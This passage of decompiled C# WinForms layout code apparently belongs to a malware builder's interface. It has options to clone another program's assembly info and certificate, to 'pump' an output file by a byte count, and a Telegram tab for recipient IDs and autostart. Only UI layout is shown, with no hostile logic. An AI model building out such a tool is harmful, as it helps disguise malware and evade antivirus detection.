		((System.Windows.Forms.Control)this.label48).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label48).Location = new System.Drawing.Point(324, 323);
		((System.Windows.Forms.Control)this.label48).Name = "label48";
		((System.Windows.Forms.Control)this.label48).Size = new System.Drawing.Size(55, 15);
		((System.Windows.Forms.Control)this.label48).TabIndex = 118;
		((System.Windows.Forms.Control)this.label48).Text = "File path:";
		((System.Windows.Forms.Control)this.metroSetDivider19).Location = new System.Drawing.Point(-32, 309);
		((System.Windows.Forms.Control)this.metroSetDivider19).Name = "metroSetDivider19";
		((MetroSetDivider)this.metroSetDivider19).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider19).Size = new System.Drawing.Size(1239, 4);
		((MetroSetDivider)this.metroSetDivider19).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider19).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider19).TabIndex = 117;
		((System.Windows.Forms.Control)this.metroSetDivider19).Text = "metroSetDivider19";
		((MetroSetDivider)this.metroSetDivider19).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider19).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider19).Thickness = 1;
		((MetroSetButton)this.b9).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.b9).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.b9).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.b9).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.b9).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.b9).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.b9).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b9).Location = new System.Drawing.Point(510, 279);
		((System.Windows.Forms.Control)this.b9).Name = "pumpBtn";
		((MetroSetButton)this.b9).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.b9).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.b9).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.b9).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.b9).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.b9).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b9).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.b9).Style = (Style)0;
		((MetroSetButton)this.b9).StyleManager = null;
		((System.Windows.Forms.Control)this.b9).TabIndex = 116;
		((System.Windows.Forms.Control)this.b9).Text = "Pump";
		((MetroSetButton)this.b9).ThemeAuthor = "Narwin";
		((MetroSetButton)this.b9).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.b9).Click += new System.EventHandler(b9_Click);
		((AnimaTextBox)this.ba).Dark = false;
		((System.Windows.Forms.Control)this.ba).Location = new System.Drawing.Point(324, 250);
		((AnimaTextBox)this.ba).MaxLength = 32767;
		((AnimaTextBox)this.ba).MultiLine = false;
		((System.Windows.Forms.Control)this.ba).Name = "bytesCount";
		((AnimaTextBox)this.ba).Numeric = false;
		((AnimaTextBox)this.ba).ReadOnly = false;
		((System.Windows.Forms.Control)this.ba).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.ba).TabIndex = 114;
		((AnimaTextBox)this.ba).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.bb).AutoSize = true;
		((System.Windows.Forms.Control)this.bb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.bb).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.bb).Location = new System.Drawing.Point(324, 232);
		((System.Windows.Forms.Control)this.bb).Name = "bytesCountLbl";
		((System.Windows.Forms.Control)this.bb).Size = new System.Drawing.Size(72, 15);
		((System.Windows.Forms.Control)this.bb).TabIndex = 113;
		((System.Windows.Forms.Control)this.bb).Text = "Bytes count:";
		((MetroSetButton)this.bc).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.bc).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.bc).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.bc).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.bc).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.bc).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.bc).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.bc).Location = new System.Drawing.Point(768, 204);
		((System.Windows.Forms.Control)this.bc).Name = "openPumpBtn";
		((MetroSetButton)this.bc).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.bc).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.bc).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.bc).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.bc).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.bc).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.bc).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.bc).Style = (Style)0;
		((MetroSetButton)this.bc).StyleManager = null;
		((System.Windows.Forms.Control)this.bc).TabIndex = 112;
		((System.Windows.Forms.Control)this.bc).Text = "Open";
		((MetroSetButton)this.bc).ThemeAuthor = "Narwin";
		((MetroSetButton)this.bc).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.bc).Click += new System.EventHandler(bc_Click);
		((AnimaTextBox)this.bd).Dark = false;
		((System.Windows.Forms.Control)this.bd).Location = new System.Drawing.Point(324, 204);
		((AnimaTextBox)this.bd).MaxLength = 32767;
		((AnimaTextBox)this.bd).MultiLine = false;
		((System.Windows.Forms.Control)this.bd).Name = "pumpPath";
		((AnimaTextBox)this.bd).Numeric = false;
		((AnimaTextBox)this.bd).ReadOnly = true;
		((System.Windows.Forms.Control)this.bd).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.bd).TabIndex = 111;
		((AnimaTextBox)this.bd).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.be).AutoSize = true;
		((System.Windows.Forms.Control)this.be).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.be).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.be).Location = new System.Drawing.Point(324, 186);
		((System.Windows.Forms.Control)this.be).Name = "pumpPathLbl";
		((System.Windows.Forms.Control)this.be).Size = new System.Drawing.Size(71, 15);
		((System.Windows.Forms.Control)this.be).TabIndex = 110;
		((System.Windows.Forms.Control)this.be).Text = "Target path:";
		((MetroSetButton)this.m_ad).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_ad).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_ad).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.m_ad).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.m_ad).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_ad).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_ad).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.m_ad).Location = new System.Drawing.Point(510, 145);
		((System.Windows.Forms.Control)this.m_ad).Name = "cloneBtn";
		((MetroSetButton)this.m_ad).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_ad).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_ad).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.m_ad).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_ad).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_ad).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.m_ad).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.m_ad).Style = (Style)0;
		((MetroSetButton)this.m_ad).StyleManager = null;
		((System.Windows.Forms.Control)this.m_ad).TabIndex = 109;
		((System.Windows.Forms.Control)this.m_ad).Text = "Clone";
		((MetroSetButton)this.m_ad).ThemeAuthor = "Narwin";
		((MetroSetButton)this.m_ad).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.m_ad).Click += new System.EventHandler(ad_Click);
		((System.Windows.Forms.Control)this.m_ae).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.m_ae).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.m_ae).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.m_ae).Checked = true;
		((MetroSetCheckBox)this.m_ae).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.m_ae).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.m_ae).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.m_ae).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.m_ae).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.m_ae).Location = new System.Drawing.Point(743, 106);
		((System.Windows.Forms.Control)this.m_ae).Name = "certificate";
		((MetroSetCheckBox)this.m_ae).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.m_ae).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.m_ae).Style = (Style)1;
		((MetroSetCheckBox)this.m_ae).StyleManager = null;
		((System.Windows.Forms.Control)this.m_ae).TabIndex = 108;
		((MetroSetCheckBox)this.m_ae).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.m_ae).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.af).AutoSize = true;
		((System.Windows.Forms.Control)this.af).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.af).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.af).Location = new System.Drawing.Point(650, 106);
		((System.Windows.Forms.Control)this.af).Name = "certificateLbl";
		((System.Windows.Forms.Control)this.af).Size = new System.Drawing.Size(64, 15);
		((System.Windows.Forms.Control)this.af).TabIndex = 107;
		((System.Windows.Forms.Control)this.af).Text = "Certificate:";
		((System.Windows.Forms.Control)this.b0).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.b0).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.b0).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.b0).Checked = true;
		((MetroSetCheckBox)this.b0).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.b0).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.b0).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.b0).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.b0).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.b0).Location = new System.Drawing.Point(415, 106);
		((System.Windows.Forms.Control)this.b0).Name = "assemblyInfo";
		((MetroSetCheckBox)this.b0).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.b0).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.b0).Style = (Style)1;
		((MetroSetCheckBox)this.b0).StyleManager = null;
		((System.Windows.Forms.Control)this.b0).TabIndex = 106;
		((MetroSetCheckBox)this.b0).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.b0).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.b1).AutoSize = true;
		((System.Windows.Forms.Control)this.b1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.b1).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.b1).Location = new System.Drawing.Point(324, 106);
		((System.Windows.Forms.Control)this.b1).Name = "assemblyInfoLbl";
		((System.Windows.Forms.Control)this.b1).Size = new System.Drawing.Size(85, 15);
		((System.Windows.Forms.Control)this.b1).TabIndex = 105;
		((System.Windows.Forms.Control)this.b1).Text = "Assembly Info:";
		((System.Windows.Forms.Control)this.b2).Location = new System.Drawing.Point(-32, 174);
		((System.Windows.Forms.Control)this.b2).Name = "metroSetDivider13";
		((MetroSetDivider)this.b2).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.b2).Size = new System.Drawing.Size(1282, 4);
		((MetroSetDivider)this.b2).Style = (Style)1;
		((MetroSetDivider)this.b2).StyleManager = null;
		((System.Windows.Forms.Control)this.b2).TabIndex = 57;
		((System.Windows.Forms.Control)this.b2).Text = "metroSetDivider13";
		((MetroSetDivider)this.b2).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.b2).ThemeName = "MetroDark";
		((MetroSetDivider)this.b2).Thickness = 1;
		((MetroSetButton)this.b3).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.b3).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.b3).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.b3).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.b3).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.b3).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.b3).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b3).Location = new System.Drawing.Point(768, 70);
		((System.Windows.Forms.Control)this.b3).Name = "openBuildBtn";
		((MetroSetButton)this.b3).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.b3).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.b3).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.b3).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.b3).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.b3).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b3).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.b3).Style = (Style)0;
		((MetroSetButton)this.b3).StyleManager = null;
		((System.Windows.Forms.Control)this.b3).TabIndex = 56;
		((System.Windows.Forms.Control)this.b3).Text = "Open";
		((MetroSetButton)this.b3).ThemeAuthor = "Narwin";
		((MetroSetButton)this.b3).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.b3).Click += new System.EventHandler(b3_Click);
		((AnimaTextBox)this.b4).Dark = false;
		((System.Windows.Forms.Control)this.b4).Location = new System.Drawing.Point(324, 70);
		((AnimaTextBox)this.b4).MaxLength = 32767;
		((AnimaTextBox)this.b4).MultiLine = false;
		((System.Windows.Forms.Control)this.b4).Name = "buildPathTb";
		((AnimaTextBox)this.b4).Numeric = false;
		((AnimaTextBox)this.b4).ReadOnly = true;
		((System.Windows.Forms.Control)this.b4).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.b4).TabIndex = 55;
		((AnimaTextBox)this.b4).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.b5).AutoSize = true;
		((System.Windows.Forms.Control)this.b5).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.b5).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.b5).Location = new System.Drawing.Point(324, 52);
		((System.Windows.Forms.Control)this.b5).Name = "buildPathLbl";
		((System.Windows.Forms.Control)this.b5).Size = new System.Drawing.Size(64, 15);
		((System.Windows.Forms.Control)this.b5).TabIndex = 54;
		((System.Windows.Forms.Control)this.b5).Text = "Build path:";
		((MetroSetButton)this.b6).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.b6).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.b6).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.b6).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.b6).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.b6).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.b6).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b6).Location = new System.Drawing.Point(768, 24);
		((System.Windows.Forms.Control)this.b6).Name = "openTargetBtn";
		((MetroSetButton)this.b6).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.b6).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.b6).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.b6).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.b6).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.b6).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b6).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.b6).Style = (Style)0;
		((MetroSetButton)this.b6).StyleManager = null;
		((System.Windows.Forms.Control)this.b6).TabIndex = 53;
		((System.Windows.Forms.Control)this.b6).Text = "Open";
		((MetroSetButton)this.b6).ThemeAuthor = "Narwin";
		((MetroSetButton)this.b6).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.b6).Click += new System.EventHandler(b6_Click);
		((AnimaTextBox)this.b7).Dark = false;
		((System.Windows.Forms.Control)this.b7).Location = new System.Drawing.Point(324, 24);
		((AnimaTextBox)this.b7).MaxLength = 32767;
		((AnimaTextBox)this.b7).MultiLine = false;
		((System.Windows.Forms.Control)this.b7).Name = "targetPathTb";
		((AnimaTextBox)this.b7).Numeric = false;
		((AnimaTextBox)this.b7).ReadOnly = true;
		((System.Windows.Forms.Control)this.b7).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.b7).TabIndex = 52;
		((AnimaTextBox)this.b7).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.b8).AutoSize = true;
		((System.Windows.Forms.Control)this.b8).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.b8).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.b8).Location = new System.Drawing.Point(324, 6);
		((System.Windows.Forms.Control)this.b8).Name = "targetPathLbl";
		((System.Windows.Forms.Control)this.b8).Size = new System.Drawing.Size(71, 15);
		((System.Windows.Forms.Control)this.b8).TabIndex = 51;
		((System.Windows.Forms.Control)this.b8).Text = "Target path:";
		((System.Windows.Forms.Control)this.f2).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.autoStartTelegramCb);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.label57);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.addIdBlackListBtn);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.removeIdBlackListBtn);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.blackListChatIds);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.label49);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.addRecipientIdBtn);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.configRecipientIdBtn);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.removeRecipientIdBtn);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.recipientsIdsListBox);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.label51);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.f3);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.f4);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.f5);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.f6);
		((System.Windows.Forms.Control)this.f2).Controls.Add((System.Windows.Forms.Control)this.f7);
		((System.Windows.Forms.Control)this.f2).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.f2).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.f2).Name = "telegramPage";
		((System.Windows.Forms.Control)this.f2).Padding = new System.Windows.Forms.Padding(3);
		((System.Windows.Forms.Control)this.f2).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.f2).TabIndex = 16;
		((System.Windows.Forms.Control)this.f2).Text = "Telegram";
		((System.Windows.Forms.Control)this.autoStartTelegramCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.autoStartTelegramCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.autoStartTelegramCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.autoStartTelegramCb).Checked = false;
		((MetroSetCheckBox)this.autoStartTelegramCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.autoStartTelegramCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.autoStartTelegramCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.autoStartTelegramCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.autoStartTelegramCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.autoStartTelegramCb).Location = new System.Drawing.Point(503, 480);
		((System.Windows.Forms.Control)this.autoStartTelegramCb).Name = "autoStartTelegramCb";
		((MetroSetCheckBox)this.autoStartTelegramCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.autoStartTelegramCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.autoStartTelegramCb).Style = (Style)1;
		((MetroSetCheckBox)this.autoStartTelegramCb).StyleManager = null;
		((System.Windows.Forms.Control)this.autoStartTelegramCb).TabIndex = 145;
		((MetroSetCheckBox)this.autoStartTelegramCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.autoStartTelegramCb).ThemeName = "MetroDark";
		((MetroSetCheckBox)this.autoStartTelegramCb).CheckedChanged += new System.EventHandler(autoStartTelegramCb_CheckedChanged);
		((System.Windows.Forms.Control)this.label57).AutoSize = true;
		((System.Windows.Forms.Control)this.label57).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label57).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label57).Location = new System.Drawing.Point(367, 480);
		((System.Windows.Forms.Control)this.label57).Name = "label57";
		((System.Windows.Forms.Control)this.label57).Size = new System.Drawing.Size(60, 15);
		((System.Windows.Forms.Control)this.label57).TabIndex = 144;
		((System.Windows.Forms.Control)this.label57).Text = "AutoStart:";
		((MetroSetButton)this.addIdBlackListBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addIdBlackListBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addIdBlackListBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.addIdBlackListBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.addIdBlackListBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addIdBlackListBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addIdBlackListBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addIdBlackListBtn).Location = new System.Drawing.Point(720, 366);
		((System.Windows.Forms.Control)this.addIdBlackListBtn).Name = "addIdBlackListBtn";
		((MetroSetButton)this.addIdBlackListBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addIdBlackListBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addIdBlackListBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.addIdBlackListBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addIdBlackListBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addIdBlackListBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addIdBlackListBtn).Size = new System.Drawing.Size(59, 23);
		((MetroSetButton)this.addIdBlackListBtn).Style = (Style)0;
		((MetroSetButton)this.addIdBlackListBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.addIdBlackListBtn).TabIndex = 138;
		((System.Windows.Forms.Control)this.addIdBlackListBtn).Text = "Add";
		((MetroSetButton)this.addIdBlackListBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.addIdBlackListBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.addIdBlackListBtn).Click += new System.EventHandler(addIdBlackListBtn_Click);
		((MetroSetButton)this.removeIdBlackListBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.removeIdBlackListBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.removeIdBlackListBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.removeIdBlackListBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.removeIdBlackListBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.removeIdBlackListBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.removeIdBlackListBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.removeIdBlackListBtn).Location = new System.Drawing.Point(579, 366);
		((System.Windows.Forms.Control)this.removeIdBlackListBtn).Name = "removeIdBlackListBtn";
		((MetroSetButton)this.removeIdBlackListBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.removeIdBlackListBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.removeIdBlackListBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.removeIdBlackListBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.removeIdBlackListBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.removeIdBlackListBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.removeIdBlackListBtn).Size = new System.Drawing.Size(59, 23);
		((MetroSetButton)this.removeIdBlackListBtn).Style = (Style)0;
		((MetroSetButton)this.removeIdBlackListBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.removeIdBlackListBtn).TabIndex = 136;
		((System.Windows.Forms.Control)this.removeIdBlackListBtn).Text = "Delete";
		((MetroSetButton)this.removeIdBlackListBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.removeIdBlackListBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.removeIdBlackListBtn).Click += new System.EventHandler(removeIdBlackListBtn_Click);
		((System.Windows.Forms.Control)this.blackListChatIds).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.blackListChatIds).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
